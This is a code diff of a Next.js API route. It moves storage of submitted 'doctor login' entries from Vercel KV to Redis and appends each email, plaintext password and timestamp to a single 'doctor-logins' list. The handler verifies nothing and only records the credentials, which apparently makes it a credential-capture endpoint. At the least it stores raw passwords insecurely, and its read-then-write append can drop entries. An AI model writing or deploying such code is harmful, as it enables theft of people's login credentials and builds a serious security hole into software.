@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
-import { kv } from "@vercel/kv";
+import redis from "../../lib/redisClient"; // adjust path if needed
 
 interface LoginEntry {
   email: string;
@@ -18,19 +18,22 @@ export async function POST(req: NextRequest) {
   try {
     const body: LoginRequest = await req.json();
 
-    // Generate a unique key for each login entry
-    const timestamp = new Date().toISOString();
-    const loginKey = `doctor-login:${timestamp}`;
-
     const loginEntry: LoginEntry = {
       email: body.email,
       password: body.password,
       rememberMe: body.rememberMe ?? false,
-      timestamp,
+      timestamp: new Date().toISOString(),
     };
 
-    // Save login in Vercel KV
-    await kv.set(loginKey, loginEntry);
+    // Fetch existing logins
+    const existingRaw = await redis.get("doctor-logins");
+    const existingLogins: LoginEntry[] = existingRaw ? JSON.parse(existingRaw as string) : [];
+
+    // Append new login
+    const updatedLogins = [...existingLogins, loginEntry];
+
+    // Store updated logins in Redis
+    await redis.set("doctor-logins", JSON.stringify(updatedLogins));
 
     return NextResponse.json({ success: true });
   } catch (error) {
